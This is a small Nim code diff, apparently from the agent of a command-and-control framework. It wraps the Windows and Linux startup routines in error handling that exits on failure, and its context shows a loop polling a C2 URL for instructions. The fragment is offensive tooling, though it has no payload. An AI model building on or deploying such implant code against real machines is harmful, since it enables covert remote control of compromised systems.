@@ -24,11 +24,13 @@ proc nimbo_main*(): void =
     var server_content: JsonNode
     var sleep_time: int
     var is_success: bool
-    when defined(windows):
-        windows_start()
-    else:
-        linux_start()
-
+    try:
+        when defined(windows):
+            windows_start()
+        else:
+            linux_start()
+    except:
+        quit()
     while true:
         try:
             res = client.get(c2_url)
